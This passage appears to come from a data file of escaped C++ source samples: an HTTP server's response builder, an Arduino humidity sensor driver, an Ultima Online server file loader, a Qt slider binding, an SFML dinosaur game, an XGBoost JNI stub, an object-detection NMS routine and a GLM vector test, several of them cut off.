buff.Append(body);\n}\n\n//\u54cd\u5e94\u9996\u884c\nvoid HttpResponse::AddStateLine_(Buffer& buff) {\n    string status;\n    if(CODE_STATUS.count(code_) == 1) { //\u5b58\u5728\n        status = CODE_STATUS.find(code_)->second; //\u54c8\u5e0c\u8868\u7684\u503c\u662f\u72b6\u6001\n    }\n    else {\n        code_ = 400; //\u9519\u8bef\u72b6\u6001\u7801\n        status = CODE_STATUS.find(400)->second;\n    }\n    buff.Append(\"HTTP/1.1 \" + to_string(code_) + \" \" + status + \"\\r\\n\");\n}\n\n//\u54cd\u5e94\u5934\nvoid HttpResponse::AddHeader_(Buffer& buff) {\n    buff.Append(\"Connection: \");\n    if(isKeepAlive_) { \n        buff.Append(\"keep-alive\\r\\n\");\n        buff.Append(\"keep-alive: max=6, timeout=120\\r\\n\");\n    } else{\n        buff.Append(\"close\\r\\n\");\n    }\n    buff.Append(\"Content-type: \" + GetFileType_() + \"\\r\\n\"); //\u6587\u4ef6\u7c7b\u578b\n    buff.Append(\"charset: utf-8\\r\\n\");\n}\n\n//\u54cd\u5e94\u5185\u5bb9\nvoid HttpResponse::AddContent_(Buffer& buff) {\n    int srcFd = open((srcDir_ + path_).data(), O_RDONLY); //\u6253\u5f00\u8d44\u6e90\n    if(srcFd < 0) { \n        ErrorContent(buff, \"File NotFound!\");\n        return; \n    }\n\n    //POST\n    if(path_ == \"/CGI/compute_.html\"){\n        AddPostContent_(buff);\n        return;\n    }\n\n    /* \u5c06\u6587\u4ef6\u6620\u5c04\u5230\u5185\u5b58\u63d0\u9ad8\u6587\u4ef6\u7684\u8bbf\u95ee\u901f\u5ea6 \n        MAP_PRIVATE \u5efa\u7acb\u4e00\u4e2a\u5199\u5165\u65f6\u62f7\u8d1d\u7684\u79c1\u6709\u6620\u5c04*/\n    //LOG_DEBUG(\"file path %s\", (srcDir_ + path_).data());\n    cout<<\"file path \"<<(srcDir_ + path_).data()<<endl;\n    int* mmRet = (int*)mmap(0, mmFileStat_.st_size, PROT_READ, MAP_PRIVATE, srcFd, 0); //mmap\u5c06\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u5176\u5b83\u5bf9\u8c61\u6620\u5c04\u8fdb\u5185\u5b58\n    if(*mmRet == -1) {\n        ErrorContent(buff, \"File NotFound!\");\n        return; \n    }\n    mmFile_ = (char*)mmRet; //\u6307\u9488\n\n    close(srcFd);\n    buff.Append(\"Content-length: \" + to_string(mmFileStat_.st_size) + \"\\r\\n\\r\\n\"); //\u54cd\u5e94\u7684\u6570\u636e\u957f\u5ea6\u5927\u5c0f\n}\n\nvoid HttpResponse::ErrorHtml_() {\n    if(CODE_PATH.count(code_) == 1) { \n        path_ = CODE_PATH.find(code_)->second;//\u54c8\u5e0c\u8868\u7684\u503c\u662f\u8d44\u6e90\u540d\n        stat((srcDir_ + path_).data(), &mmFileStat_);\n    }\n}\n\n//\u83b7\u53d6\u6587\u4ef6\u7c7b\u578b \u83b7\u53d6\u540e\u7f00\nstring HttpResponse::GetFileType_() {\n    /* \u5224\u65ad\u6587\u4ef6\u7c7b\u578b */\n    string::size_type idx = path_.find_last_of('.');\n    if(idx == string::npos) {\n        return \"text/plain\";\n    }\n    string suffix = path_.substr(idx);\n    if(SUFFIX_TYPE.count(suffix) == 1",
    "/*\n *  Copyright (c) 2018, Sensirion AG <andreas.brauchli@sensirion.com>\n *  Copyright (c) 2015-2016, Johannes Winkelmann <jw@smts.ch>\n *  All rights reserved.\n *\n *  Redistribution and use in source and binary forms, with or without\n *  modification, are permitted provided that the following conditions are met:\n *      * Redistributions of source code must retain the above copyright\n *        notice, this list of conditions and the following disclaimer.\n *      * Redistributions in binary form must reproduce the above copyright\n *        notice, this list of conditions and the following disclaimer in the\n *        documentation and/or other materials provided with the distribution.\n *      * Neither the name of the Sensirion AG nor the names of its\n *        contributors may be used to endorse or promote products derived\n *        from this software without specific prior written permission.\n *\n *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n *  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY\n *  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n *  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n *  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n *  ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n *  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n *  THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <inttypes.h>\n#include <Arduino.h>\n\n#include \"SHTSensor.h\"\n\n\n//\n// class SHTSensorDriver\n//\n\nSHTSensorDriver::~SHTSensorDriver()\n{\n}\n\nbool SHTSensorDriver::readSample()\n{\n  return false;\n}\n\n\n//\n// class SHTI2cSensor\n//\n\nconst uint8_t SHTI2cSensor::EXPECTED_DATA_SIZE   = 6;\n\nbool SHTI2cSensor::readFromI2c(TwoWire & wire,\n                               uint8_t i2cAddress,\n                               const uint8_t *i2cCommand,\n                               uint8_t commandLength, uint8_t *data,\n                               uint8_t dataLength,\n                               uint8_t duration)\n{\n  wire.beginTransmission(i2cAddress);\n  for (int i = 0; i < commandLength; ++i) {\n    if (wire.write(i2cCommand[i]) != 1) {\n      return false;\n    }\n  }\n\n  if (wire.endTransmission() != 0) {\n    return false;\n  }\n\n  delay(duration);\n\n  wire.requestFrom(i2cAddress, dataLength);\n\n  // check if the same number of bytes are received that are requested.\n  if (wire.available() != dataLength) {\n    return false;\n  }\n\n  for (int i = 0; i < dataLength; ++i) {\n    data[i] = wire.read();\n  }\n  return true;\n}\n\nuint8_t SHTI2cSensor::crc8(const uint8_t *data, uint8_t len)\n{\n  // adapted from SHT21 sample code from\n  // http://www.sensirion.com/en/products/humidity-temperature/download-center/\n\n  uint8_t crc = 0xff;\n  uint8_t byteCtr;\n  for (byteCtr = 0; byteCtr < len; ++byteCtr) {\n    crc ^= data[byteCtr];\n    for (uint8_t bit = 8; bit > 0; --bit) {\n      if (crc & 0x80) {\n        crc = (crc << 1) ^ 0x31;\n      } else {\n        crc = (crc << 1);\n      }\n    }\n  }\n  return crc;\n}\n\n\nbool SHTI2cSensor::readSample()\n{\n  uint8_t data[EXPECTED_DATA_SIZE];\n  uint8_t cmd[mCmd_Size];\n\n  cmd[0] = mI2cCommand >> 8;\n  //is omitted for SHT4x Sensors\n  cmd[1] = mI2cCommand & 0xff;\n\n  if (!readFromI2c(mWire, mI2cAddress, cmd, mCmd_Size, data,\n                   EXPECTED_DATA_SIZE, mDuration)) {\n    return false;\n  }\n\n  // -- Important: assuming each 2 byte of data is followed by 1 byte of CRC\n\n  // check CRC for both RH and T\n  if (crc8(&data[0], 2) != data[2] || crc8(&data[3], 2) != data[5]) {\n    return false;\n  }\n\n  // convert to Temperature/Humidity\n  uint16_t val;\n  val = (data[0] << 8) + data[1];\n  mTemperature = mA + mB * (val / mC);\n\n  val = (data[3] << 8) + data[4];\n  mHumidity = mX + mY * (val / mZ);\n\n  return true;\n\n}\n\n//\n// class SHTC1Sensor\n//\n\nclass SHTC1Sensor : public SHTI2cSensor\n{\npublic:\n    SHTC1Sensor(TwoWire & wire)\n        // clock stretching disabled, high precision, T first\n        : SHTI2cSensor(0x70, 0x7866, 15, -45, 175, 65535, 0, 100, 65535, 2, wire)\n    {\n    }\n};\n\n\n//\n// class SHT3xSensor\n//\n\nclass SHT3xSensor : public SHTI2cSensor\n{\nprivate:\n  static const uint16_t SHT3X_ACCURACY_HIGH    = 0x2400;\n  static const uint16_t SHT3X_ACCURACY_MEDIUM  = 0x240b;\n  static const uint16_t SHT3X_ACCURACY_LOW     = 0x2416;\n\n  static const uint8_t SHT3X_ACCURACY_HIGH_DURATION   = 15;\n  static const uint8_t SHT3X_ACCURACY_MEDIUM_DURATION = 6;\n  static const uint8_t SHT3X_ACCURACY_LOW_DURATION    = 4;\n\npublic:\n  static const uint8_t SHT3X_I2C_ADDRESS_44 = 0x44;\n  static const uint8_t SHT3X_I2C_ADDRESS_45 = 0x45;\n\n  SHT3xSensor(TwoWire & wire, uint8_t i2cAddress = SHT3X_I2C_ADDRESS_44)\n      : SHTI2cSensor(i2cAddress, SHT3X_ACCURACY_HIGH,\n                     SHT3",
    "//\n// GRAYINST.CPP\n// Copyright Menace Software (www.menasoft.com).\n//\n\n#if defined(GRAY_MAKER)\n#include \"../graymaker/stdafx.h\"\n#include \"../graymaker/graymaker.h\"\n\n#elif defined(GRAY_AGENT)\n#include \"../grayagent/stdafx.h\"\n#include \"../grayagent/grayagent.h\"\n\n#else\n#include \"graycom.h\"\n#include \"cgrayinst.h\"\n#endif\n\nbool CGrayInstall::FindInstall()\n{\n#ifdef _WIN32\n\t// Get the install path from the registry.\n\tHKEY hKey;\n\tLONG lRet = RegOpenKeyEx( HKEY_LOCAL_MACHINE, \n\t\t\"Software\\\\Origin Worlds Online\\\\Ultima Online\\\\1.0\", // address of name of subkey to query \n\t\t0, KEY_READ, \n\t\t&hKey );\n\tif ( lRet != ERROR_SUCCESS )\n\t\treturn( false );\n\n\tTCHAR szValue[ _MAX_PATH ];\n\tDWORD lSize = sizeof( szValue );\n\tDWORD dwType = REG_SZ;\n\tlRet = RegQueryValueEx( hKey, \n\t\t_TEXT(\"ExePath\"), // address of name of subkey to query \n\t\tNULL, &dwType,\n\t\t(BYTE*) szValue, &lSize );\n\n\tif ( lRet == ERROR_SUCCESS && dwType == REG_SZ )\n\t{\n\t\tTCHAR * pSlash = strrchr( szValue, '\\\\' );\t// get rid of the client.exe part of the name\n\t\tif ( pSlash ) * pSlash = '\\0';\n\t\tm_sExePath = szValue;\n\t}\n\n\t// ??? Find CDROM install base as well, just in case.\n\t// uo.cfg CdRomDataPath=e:\\uo\n\n\tlRet = RegQueryValueEx( hKey, \n\t\t_TEXT(\"InstCDPath\"), // address of name of subkey to query \n\t\tNULL, &dwType,\n\t\t(BYTE*) szValue, &lSize );\n\n\tif ( lRet == ERROR_SUCCESS && dwType == REG_SZ )\n\t{\n\t\tm_sCDPath = szValue;\n\t}\n\n\tRegCloseKey( hKey );\n\n#else\n\t// LINUX has no registry so we must have the INI file show us where it is installed.\n#endif\n\n\treturn( true );\n}\n\nconst TCHAR * CGrayInstall::GetBaseFileName( VERFILE_TYPE i ) // static\n{\n\tstatic const TCHAR * szFileNames[VERFILE_QTY] = \n\t{\n\t\t\"map0.mul\",\t\t// Terrain data\n\t\t\"staidx0.mul\",\t// Index into STATICS0\n\t\t\"statics0.mul\", // Static objects on the map\n\t\t\"artidx.mul\",\t// Index to ART\n\t\t\"art.mul\",\t\t// Artwork such as ground, objects, etc.\n\t\t\"anim.idx\",\n\t\t\"anim.mul\",\t\t// Animations such as monsters, people, and armor.\n\t\t\"soundidx.mul\", // Index into SOUND\n\t\t\"sound.mul\",\t// Sampled sounds \n\t\t\"texidx.mul\",\t// Index into TEXMAPS\n\t\t\"texmaps.mul\",\t// Texture map data (the ground).\n\t\t\"gumpidx.mul\",\t// Index to GUMPART\n\t\t\"gumpart.mul\",\t// Gumps. Stationary controller bitmaps such as windows, buttons, paperdoll pieces, etc.\n\t\t\"multi.idx\",\n\t\t\"multi.mul\",\t// Groups of art (houses, castles, etc)\n\t\t\"skills.idx\",\n\t\t\"skills.mul\",\n\t\t\"radarcol.mul\",\t// color tranlation form terrain to radar map.\n\t\t\"fonts.mul\",\t//  Fixed size bitmaps style fonts. \n\t\t\"palette.mul\",\t// Contains an 8 bit palette (use unknown)\n\t\t\"light.mul\",\t// light pattern bitmaps.\n\t\t\"lightidx.mul\", // light pattern bitmaps.\n\t\t\"hues.mul\",\t\t// the 16 bit color pallete we use for everything.\n\t\t\"verdata.mul\",\n\t\tNULL,\n\t\tNULL,\n\t\tNULL,\n\t\tNULL,\n\t\tNULL,\n\t\tNULL,\n\t\t\"tiledata.mul\", // Data about tiles in ART. name and flags, etc\n\t\t\"animdata.mul\", //\n\t};\n\n\tif ( i<0 || i>=VERFILE_QTY ) \n\t\treturn( NULL );\n\treturn( szFileNames[ i ] );\n}\n\nbool CGrayInstall::OpenFile( CFileBin & file, const TCHAR * pszName, WORD wFlags )\n{\n\tif ( ! m_sPreferPath.IsEmpty())\n\t{\n\t\tif ( file.Open( GetPreferPath( pszName ), wFlags ))\n\t\t\treturn true;\n\t}\n\n#ifdef _AFXDLL\n\tCFileException e;\n\tif ( file.Open( GetFullExePath( pszName ), wFlags, &e ))\n\t\treturn true;\n\tif ( file.Open( GetFullCDPath( pszName ), wFlags, &e ))\n\t\treturn true;\n#else\n\tif ( file.Open( GetFullExePath( pszName ), wFlags ))\n\t\treturn true;\n\tif ( file.Open( GetFullCDPath( pszName ), wFlags ))\n\t\treturn true;\n#endif\n\n\treturn( false );\n}\n\nbool CGrayInstall::SetMulFile( VERFILE_TYPE i, const TCHAR * pszName )\n{\n\t// Close(); // then reopen later ?\n\tCFileBin * pFile = GetMulFile(i);\n\tif ( pFile == NULL ) \n\t\treturn false;\n\tpFile->SetFilePath( pszName );\n\treturn( true );\n}\n\nbool CGrayInstall::OpenFile( VERFILE_TYPE i )\n{\n\tASSERT( i < VERFILE_QTY );\n\tif ( m_File[i].IsFileOpen()) \n\t\treturn( true );\n\n\tconst TCHAR * pszName = GetBaseFileName( (VERFILE_TYPE) i );\n\tif ( pszName == NULL ) \n\t\treturn( false );\n\n\treturn( OpenFile( m_File[i], pszName, OF_READ|OF_SHARE_DENY_WRITE ));\n}\n\nVERFILE_TYPE CGrayInstall::OpenFiles( DWORD dwMask )\n{\n\t// Now open all the required files.\n\t// REUTRN: VERFILE_QTY = all open success.\n\n\tint i;\n\tfor ( i=0; i<VERFILE_QTY; i++ )\n\t{\n\t\tif ( ! ( dwMask & ( 1 << i ))) \n\t\t\tcontinue;\n\t\tif ( GetBaseFileName( (VERFILE_TYPE) i ) == NULL )\n\t\t\tcontinue;\n\n\t\tif ( ! OpenFile( (VERFILE_TYPE) i ))\n\t\t{\n\t\t\tif ( i == VERFILE_VERDATA )\n\t\t\t\tcontinue;\t// this is optional\n\t\t\t// Problems ! Can't open the file anyplace !\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn( (VERFILE_TYPE) i );\n}\n\nvoid CGrayInstall::CloseFiles()\n{\n\tfor ( int i=0; i<VERFILE_QTY; i++ )\n\t{\n\t\tm_File[i].Close();\n\t}\n}\n\nbool CGrayInstall::ReadMulIndex( VERFILE_TYPE fileindex, VERFILE_TYPE filedata, DWORD id, CUOIndexRec & Index )\n{\n\t// Read about this data type in one of the index files.\n\t// RETURN: true = we are ok.\n\tASSERT(fileindex<VERFILE_QTY);\n\n\t// Is there an index for it in the VerData ?\n\tif ( g_VerData.FindVerDataBlock( filedata, id, Index ))\n\t{\n\t\treturn( true );\n\t}\n\tif ( ! m_File[fileindex].Seek( id * si",
    "#include \"QtWidgets/QSlider/qslider_wrap.h\"\n\n#include <QWidget>\n\n#include \"Extras/Utils/nutils.h\"\n#include \"QtWidgets/QWidget/qwidget_wrap.h\"\n\nNapi::FunctionReference QSliderWrap::constructor;\n\nNapi::Object QSliderWrap::init(Napi::Env env, Napi::Object exports)\n{\n    Napi::HandleScope scope(env);\n    char CLASSNAME[] = \"QSlider\";\n    Napi::Function func = DefineClass(env, CLASSNAME, {QABSTRACTSLIDER_WRAPPED_METHODS_EXPORT_DEFINE(QSliderWrap)});\n    constructor = Napi::Persistent(func);\n    exports.Set(CLASSNAME, func);\n    QOBJECT_REGISTER_WRAPPER(QSlider, QSliderWrap);\n    return exports;\n}\n\nQSlider *QSliderWrap::getInternalInstance()\n{\n    return this->instance;\n}\n\nQSliderWrap::QSliderWrap(const Napi::CallbackInfo &info) : Napi::ObjectWrap<QSliderWrap>(info)\n{\n    Napi::Env env = info.Env();\n    size_t argCount = info.Length();\n    if (argCount == 0)\n    {\n        // --- Construct a new instance\n        this->instance = new NSlider();\n    }\n    else if (argCount == 1)\n    {\n        if (info[0].IsExternal())\n        {\n            // --- Wrap a given C++ instance\n            this->instance = info[0].As<Napi::External<QSlider>>().Data();\n        }\n        else\n        {\n            // --- Construct a new instance and pass a parent\n            Napi::Object parentObject = info[0].As<Napi::Object>();\n            NodeWidgetWrap *parentWidgetWrap = Napi::ObjectWrap<NodeWidgetWrap>::Unwrap(parentObject);\n            this->instance = new NSlider(parentWidgetWrap->getInternalInstance());\n        }\n    }\n    else\n    {\n        Napi::TypeError::New(env, \"Vixen: QSliderWrap: Wrong number of arguments to constructor\")\n            .ThrowAsJavaScriptException();\n    }\n    this->rawData = extrautils::configureQWidget(this->getInternalInstance(), true);\n}\n\nQSliderWrap::~QSliderWrap()\n{\n    extrautils::safeDelete(this->instance);\n}\n",
    "\ufeff//[C++ SFML \uad6c\uae00 \uacf5\ub8e1\uac8c\uc784 \ub9cc\ub4e4\uae30]\n//by. BlockDMask.\n\n#include<SFML/Graphics.hpp>\nusing namespace sf;\n#define WIDTH 600\n#define HEIGHT 300\nstruct Position\n{\n\tint x;\n\tint y;\n};\n\nint main(void)\n{\n\t//SFML \uc708\ub3c4\uc6b0\uc744 \uc5f4\uc5b4\uc8fc\uace0, title\uc744 \uc815\ud574\uc90d\ub2c8\ub2e4.\n\tRenderWindow window(VideoMode(WIDTH, HEIGHT), \"Dinosaur Game. By BlockDMask\");\n\twindow.setFramerateLimit(60);\t//\ud504\ub808\uc784 \uc815\ud574\uc8fc\uae30\n\n\t//dino\n\tTexture t1;\n\tTexture t2;\n\tt1.loadFromFile(\"images/dino1.png\");\t//\uc2e4\uc81c \uadf8\ub9bc\uc744 \ubc1b\uc544 \uc635\ub2c8\ub2e4.\n\tt2.loadFromFile(\"images/dino2.png\");\n\n\t//\uc2a4\ud504\ub77c\uc774\ud2b8\ub85c \ub9cc\ub4e4\uc5b4\uc90c\n\tSprite dinoArr[2];\n\tdinoArr[0] = Sprite(t1);\n\tdinoArr[1] = Sprite(t2);\n\n\tstatic const int DINO_Y_BOTTOM = HEIGHT - t1.getSize().y;\t//\uacf5\ub8e1 \ubc14\ub2e5\uc704\uce58\n\n\tPosition dinoPos;\n\tdinoPos.x = 50;\n\tdinoPos.y = DINO_Y_BOTTOM;\n\n\t//\ud504\ub808\uc784\uc5d0 \ub530\ub77c \uc67c\ubc1c \uc624\ub978\ubc1c \ud574\uc8fc\uae30 \uc704\ud55c \ubcc0\uc218 \ub124\uac1c\n\tint index = 0;\t//\uc67c\ubc1c \uc624\ub978\ubc1c \uc778\ub371\uc2a4\n\tfloat frame = 0.f;\n\tfloat frameSpeed = 0.4f;\n\tconst int changeCount = 5;\t//\uba87 \ud504\ub808\uc784\uc5d0 \uccb4\uc778\uc9c0 \ud560\uc9c0\n\n\tconst int gravity = 5;\t//\uc911\ub825. \uc810\ud504\ud560\ub54c \uc0ac\uc6a9\n\tbool isJumping = false;\t//\uc810\ud504 \uc911\uc778\uc9c0\n\tbool isBottom = true;\t//\ubc14\ub2e5\uc5d0 \ubc1c\uc774 \ub2ff\uc558\ub294\uc9c0\n\n\t//tree\n\tTexture t3;\n\tt3.loadFromFile(\"images/tree.png\");\n\tSprite tree(t3);\n\n\tstatic const int TREE_Y_BOTTOM = HEIGHT - t3.getSize().y;\t//\ub098\ubb34 \ubc14\ub2e5\n\tPosition treePos;\n\ttreePos.x = WIDTH - 20;\n\ttreePos.y = TREE_Y_BOTTOM;\n\n\tconst int treeSpeed = 4;\t//\ub098\ubb34 \uc2a4\ud53c\ub4dc\n\n\twhile (window.isOpen())\t\t//\uc708\ub3c4\uc6b0\uac00 \uc5f4\ub838\uc73c\uba74\n\t{\n\t\tEvent e;\n\t\twhile (window.pollEvent(e))\t//\uc708\ub3c4\uc6b0 \uc774\ubca4\ud2b8\ub97c \ubc1b\ub294\ub370\n\t\t{\n\t\t\tif (e.type == Event::Closed)\t//\ub2eb\uae30\uba74 \uc708\ub3c4\uc6b0 \ub2eb\uc74c\n\t\t\t{\n\t\t\t\twindow.close();\n\t\t\t}\n\t\t}\n\t\t//logic.\n\n\t\t//dino jump.\n\t\tif (Keyboard::isKeyPressed(Keyboard::Space)) //\uc2a4\ud398\uc774\uc2a4 \uc785\ub825 \uac10\uc9c0\n\t\t{\n\t\t\tif (isBottom && !isJumping)\t//\ubc14\ub2e5\uc774\uace0, \uc810\ud504\uc911\uc774 \uc544\ub2d0\ub54c \uc810\ud504 \uac00\ub2a5\n\t\t\t{\n\t\t\t\t//make jumping stage;\n\t\t\t\tisJumping = true;\n\t\t\t\tisBottom = false;\n\t\t\t}\n\t\t}\n\n\t\t//dino jump(up and down)\n\t\tif (isJumping)\n\t\t{\n\t\t\tdinoPos.y -= gravity; \n\t\t}\n\t\telse\n\t\t{\n\t\t\tdinoPos.y += gravity;\n\t\t}\n\n\t\t//dino jump limit, dino bottom limit.\n\t\tif (dinoPos.y >= DINO_Y_BOTTOM)\t//\ubc14\ub2e5\uc5d0\uc11c \uc9c0\ud558\ub85c \uac00\uc9c0 \uc54a\ub3c4\ub85d \uc124\uc815\n\t\t{\n\t\t\tdinoPos.y = DINO_Y_BOTTOM;\n\t\t\tisBottom = true;\n\t\t}\n\t\tif (dinoPos.y <= DINO_Y_BOTTOM - 100)\t//\uc810\ud504\ud574\uc11c \uc6b0\uc8fc\ub85c \uac00\uc9c0 \uc54a\ub3c4\ub85d \uc124\uc815\n\t\t{\n\t\t\tisJumping = false;\n\t\t}\n\n\t\t//dino step.\n\t\tframe += frameSpeed;\n\t\tif (frame > changeCount)\n\t\t{\n\t\t\tframe -= changeCount;\n\t\t\t++index;\n\t\t\tif (index >= 2) { index = 0; }\n\t\t}\n\n\t\t//tree move.\n\t\tif (treePos.x <= 0)\n\t\t{\n\t\t\ttreePos.x = WIDTH;\n\t\t}\n\t\telse\n\t\t{\n\t\t\ttreePos.x -= treeSpeed;\n\t\t}\n\n\t\t//tree Position.\n\t\ttree.setPosition(treePos.x, treePos.y);\n\n\t\t//dino Position.\n\t\tdinoArr[index].setPosition(dinoPos.x, dinoPos.y);\n\n\t\t//draw.\n\t\twindow.clear(Color::White);\n\t\twindow.draw(dinoArr[index]);\n\t\twindow.draw(tree);\n\t\twindow.display();\n\t}\n\treturn 0;\n}",
    "/**\n * Copyright 2021-2024, XGBoost Contributors\n */\n#ifndef XGBOOST_USE_CUDA\n\n#include <jni.h>\n\n#include \"../../../../src/common/common.h\"\n#include \"../../../../src/c_api/c_api_error.h\"\n\nnamespace xgboost {\nnamespace jni {\nXGB_DLL int XGDeviceQuantileDMatrixCreateFromCallbackImpl(JNIEnv *jenv, jclass jcls,\n                                                          jobject jiter,\n                                                          jfloat jmissing,\n                                                          jint jmax_bin, jint jnthread,\n                                                          jlongArray jout) {\n  API_BEGIN();\n  common::AssertGPUSupport();\n  API_END();\n}\nXGB_DLL int XGQuantileDMatrixCreateFromCallbackImpl(JNIEnv *jenv, jclass jcls,\n                                                    jobject jdata_iter, jlongArray jref,\n                                                    char const *config, jlongArray jout) {\n  API_BEGIN();\n  common::AssertGPUSupport();\n  API_END();\n}\n} // namespace jni\n} // namespace xgboost\n#endif  // XGBOOST_USE_CUDA\n",
    "#include <utils/common.h>\n#include <detector/detector.h>\n\nstd::vector<Armor> Detector::detect(cv::Mat) {\n    RCLCPP_ERROR(logger, \"ERROR base detector detect\");\n    return {};\n}\n\nvoid Detector::draw(cv::Mat, const std::vector<Armor>&) {\n    RCLCPP_ERROR(logger, \"ERROR base detector draw\");\n}\n\ncv::Mat Detector::static_resize(cv::Mat img, int INPUT_H, int INPUT_W) {\n    float r = std::min(INPUT_W / (img.cols * 1.0), INPUT_H / (img.rows * 1.0));\n    // r = std::min(r, 1.0f);\n    int unpad_w = r * img.cols;\n    int unpad_h = r * img.rows;\n    cv::Mat re(unpad_h, unpad_w, CV_8UC3);\n    cv::resize(img, re, re.size());\n    // cv::Mat out(INPUT_W, INPUT_H, CV_8UC3, cv::Scalar(114, 114, 114));\n    cv::Mat out(INPUT_H, INPUT_W, CV_8UC3, cv::Scalar(114, 114, 114));\n    re.copyTo(out(cv::Rect(0, 0, re.cols, re.rows)));\n    return out;\n}\n\nNetDetector::NetDetector(const std::string& config_file, const std::string& share_dir,\n                         const rclcpp::Logger& _logger)\n    : Detector(config_file, share_dir, _logger) {\n    type = config.at(\"type\").as_string();\n\n    INPUT_W = config.at(\"INPUT_W\").as_integer();\n    INPUT_H = config.at(\"INPUT_H\").as_integer();\n\n    NUM_CLASSES = config.at(\"NUM_CLASSES\").as_integer();\n    NUM_COLORS = config.at(\"NUM_COLORS\").as_integer();\n\n    BBOX_CONF_THRESH = config.at(\"BBOX_CONF_THRESH\").as_floating();\n    NMS_THRESH = config.at(\"NMS_THRESH\").as_floating();\n    MERGE_THRESH = config.at(\"MERGE_THRESH\").as_floating();\n\n    point_num = config.at(\"point_num\").as_integer();\n    class_names = toml::get<std::vector<std::string>>(config.at(\"class_names\"));\n    color_names = toml::get<std::vector<std::string>>(config.at(\"color_names\"));\n    tsize_names = toml::get<std::vector<std::string>>(config.at(\"tsize_names\"));\n\n    model_prefix = share_dir + \"/\" + std::string(config.at(\"model_prefix\").as_string());\n\n    if (type == \"V8\") {\n        this->decoder = std::make_shared<YOLOv8Decoder>(config, logger);\n    } else if (type == \"V5.1\") {\n        this->decoder = std::make_shared<YOLOv5_1_Decoder>(config, logger);\n    } else if (type == \"V5\") {\n        this->decoder = std::make_shared<YOLOv5Decoder>(config, logger);\n    } else {\n        RCLCPP_ERROR(logger, \"Invalid type for NetDecoder: %s\", type.c_str());\n        rclcpp::shutdown();\n    }\n}\n\nstd::vector<Armor> NetDetector::do_nms(std::vector<Armor>& objects) {\n    std::vector<int> classIds;\n    std::vector<int> indices;\n    std::vector<float> confidences;\n    std::vector<cv::Rect> bboxes;\n    std::vector<Armor> result;\n    for (size_t i = 0; i < objects.size(); ++i) {\n        bboxes.push_back(objects[i].rect);\n        confidences.push_back(objects[i].conf);\n        int cls_id = objects[i].color * 9 + objects[i].type;\n        classIds.push_back(cls_id);\n    }\n    cv::dnn::NMSBoxes(bboxes, confidences, BBOX_CONF_THRESH, NMS_THRESH, indices);\n    for (size_t i = 0; i < indices.size(); ++i) {\n        result.push_back(objects[indices[i]]);\n    }\n    return result;\n}\n\nfloat calc_iou(const Armor& a, const Armor& b) {\n    cv::Rect_<float> inter = a.rect & b.rect;\n    float inter_area = inter.area();\n    float union_area = a.rect.area() + b.rect.area() - inter_area;\n    return inter_area / union_area;\n}\n\n/**\n * @brief do Merge Non-Maximum Suppression on detected objects, avoiding overlapped objects\n *\n * @param objects all detected objects\n * @return std::vector<armor::Armor> result\n */\nstd::vector<Armor> NetDetector::do_merge_nms(std::vector<Armor>& objects) {\n    struct pick_merge_store {\n        int id;\n        std::vector<cv::Point2f> merge_pts;\n        std::vector<float> merge_confs;\n    };\n    struct armor_compare {\n        bool operator()(const Armor& a, const Armor& b) { return a.conf > b.conf; }\n    };\n\n    std::vector<Armor> result;\n    std::vector<pick_merge_store> picked;\n\n    std::sort(objects.begin(), objects.end(), armor_compare());\n    for (int i = 0; i < (int)objects.size(); ++i) {\n        const Armor& now = objects[i];\n        bool keep = 1;\n        for (int j = 0; j < (int)picked.size(); ++j) {\n            const Armor& pre = objects[picked[j].id];\n            float iou = calc_iou(now, pre);\n\n            // store for merge_nms\n            if (iou > NMS_THRESH || isnan(iou)) {\n                keep = 0;\n                if (iou > MERGE_THRESH && now.color == pre.color && now.type == pre.type &&\n                    now.size == pre.size) {\n                    picked[j].merge_confs.push_back(now.conf);\n                    for (int k = 0; k < 5; ++k) {\n                        picked[j].merge_pts.push_back(now.pts[k]);\n                    }\n                }\n                break;\n            }\n        }\n        if (keep) {\n            picked.push_back({i, {}, {}});\n        }\n    }\n    for (int i = 0; i < (int)picked.size(); ++i) {\n        int merge_num = picked[i].merge_confs.size();\n        Armor now = objects[picked[i].id];\n        double conf_sum = now.conf;\n        for (int j = 0; j < 5; ++j) now.pts[j] *= now.conf;\n        for (int j =",
    "#ifndef GLM_FORCE_PURE\n#\tdefine GLM_FORCE_PURE\n#endif//GLM_FORCE_PURE\n#define GLM_FORCE_DEFAULT_ALIGNED_GENTYPES\n#define GLM_FORCE_SWIZZLE\n#include <glm/ext/vector_relational.hpp>\n#include <glm/vector_relational.hpp>\n#include <glm/vec2.hpp>\n#include <glm/vec3.hpp>\n#include <glm/vec4.hpp>\n#include <ctime>\n#include <vector>\n\nstatic int test_vec4_ctor()\n{\n\tint Error = 0;\n\n\t{\n\t\tglm::ivec4 A(1, 2, 3, 4);\n\t\tglm::ivec4 B(A);\n\t\tError += glm::all(glm::equal(A, B)) ? 0 : 1;\n\t}\n\n#\tif GLM_HAS_TRIVIAL_QUERIES\n\t//\tError += std::is_trivially_default_constructible<glm::vec4>::value ? 0 : 1;\n\t//\tError += std::is_trivially_copy_assignable<glm::vec4>::value ? 0 : 1;\n\t\tError += std::is_trivially_copyable<glm::vec4>::value ? 0 : 1;\n\t\tError += std::is_trivially_copyable<glm::dvec4>::value ? 0 : 1;\n\t\tError += std::is_trivially_copyable<glm::ivec4>::value ? 0 : 1;\n\t\tError += std::is_trivially_copyable<glm::uvec4>::value ? 0 : 1;\n\n\t\tError += std::is_copy_constructible<glm::vec4>::value ? 0 : 